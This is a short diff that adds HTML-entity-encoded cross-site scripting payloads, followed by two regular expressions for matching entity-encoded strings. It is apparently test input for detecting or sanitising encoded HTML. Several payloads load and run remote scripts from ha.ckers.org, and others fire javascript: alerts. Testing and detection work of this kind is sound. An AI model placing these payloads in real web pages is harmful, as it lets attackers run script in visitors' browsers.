@@ -1,0 +1,18 @@
+&lt;iframe src=http&#58;//ha&#46;ckers&#46;org/scriptlet&#46;html&gt;
+&lt;IMG SRC=\"javascript&#058;alert('XSS')\"
+&lt;SCRIPT SRC=//ha&#46;ckers&#46;org/&#46;js&gt;
+&lt;SCRIPT SRC=http&#58;//ha&#46;ckers&#46;org/xss&#46;js?&lt;B&gt;
+&lt;&lt;SCRIPT&gt;alert(\"XSS\");//&lt;&lt;/SCRIPT&gt;
+&lt;SCRIPT/SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
+&lt;BODY onload!#$%&()*~+-_&#46;,&#58;;?@&#91;/|\&#93;^`=alert(\"XSS\")&gt;
+&lt;SCRIPT/XSS SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
+&lt;IMG SRC=\"   javascript&#058;alert('XSS');\"&gt;
+
+
+
+(?i)([\&a-z\#]{2,})(?=\;)
+
+
+
+
+^&[a-z]+=?;[\sA-z0-9\|\=\-\'\"\;\:\.\>\?\/\\\<\)\(\{\}\#\d\&\!\~\$\%\*\+\_\,\@]+=?[a-z]=?;$
